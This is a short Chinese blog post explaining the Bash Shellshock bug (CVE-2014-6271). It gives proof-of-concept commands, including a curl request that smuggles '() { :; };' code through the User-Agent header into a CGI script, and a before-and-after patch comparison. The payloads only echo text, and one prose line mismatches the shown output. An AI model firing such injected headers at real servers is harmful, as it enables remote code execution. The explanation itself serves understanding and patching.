---
title: Shellshock
---

Bash 有一项特性，可以用环境变量的形式定义函数，然后在一个新 shell 启动的时候，便可以执行这个函数：

	# on gentoo, affected version
	$ bash --version
	GNU bash, version 4.2.45(1)-release (i686-pc-linux-gnu)
	$ env HELLO="() { echo 'hello'; }" bash -c HELLO                   
	hello

这本来就很危险，远在 Shellshock 漏洞被发现之前，就有人担心使用 Bash 的自动导入函数功能会导致系统中那些不需要使用绝对路径来访问的标准程序被覆盖：

	# on gentoo, affected version
	$ env ls="() { echo 'Game over'; }" bash -c ls

### 漏洞

这里先不论该 Bash 特性的好坏，不过这次发现的 CVE-2014-6271 毫无疑问是一个漏洞。执行以下代码：

	# on gentoo, affected version
	$ env CVE_2014_6271="() { echo 'Hello';}; echo 'Goodbye'" bash -c \
	CVE_2014_6271
	Goodbye
	Hello

你会发现运行结果除了打印了“hello”，还打印了“world”。问题出在自动导入函数的解析器越过了函数定义的结尾，接着执行后面的代码——并且由于每一个新的 Bash 启动时都会触发这个漏洞，相当于任意代码都能被执行了。

当我们在 Apache 服务器中使用`mod_cgi`（不包括`mod_php`或`mod_python`）运行脚本的时候，数据是通过环境变量来传递的，这可以算是互联网领域最古老的一些技术了。其他一些客户端也会受到影响——比如 Linux 的 DHCP 客户端——它大量运用 Bash 脚本来使修改生效，这也使黑客能通过在 DHCP 数据包中加入恶意数据来达到攻击的目的。

鉴于 Bash 是大多数 Linux 系统上默认的 shell，这个漏洞就意味着，把有害数据编入环境变量，传到服务器端，触发服务器运行脚本，就完成了攻击。举个例子，HTTP  协议的头 User-Agent 通常是通过环境变量`HTTP_USER_AGENT`来传递的，这意味使用以下命令就可以利用这个漏洞了：

	$ curl -A "() { :; }; echo 'Game Over'}" \
	http://example.com/some-cgi/script.cgi

这条命令是指以`() { :; }; echo 'Game Over'}`为 User-agent 去下载那个脚本。而这里的`{ :; }`是什么意思呢？这可能是 Bash 里定义一个函数可能有的最简单的写法了。单单写一个`{ }`是有语法错误的，而如果要把一个函数定义在一行里，必须在其后加上`;`。

### 修复

针对此问题打了补丁的 Shell 似乎是直接关闭了通过环境变量导入函数的功能。以下测试在 Ubuntu Server 14.04 进行：

	# on ubuntu, patched version
	$ bash --version
	GNU bash, version 4.3.11(1)-release (x86_64-pc-linux-gnu)
	$ env HELLO="() { echo 'hello'; }" bash -c HELLO                   
	bash: HELLO: command not found

	# on ubuntu, patched version
	$ env CVE_2014_6271="() { echo 'Hello';}; echo 'Goodbye'" bash -c \
	CVE_2014_6271
	bash: CVE_2014_6271: command not found

_reference: http://www.infoq.com/cn/news/2014/09/shellshock_
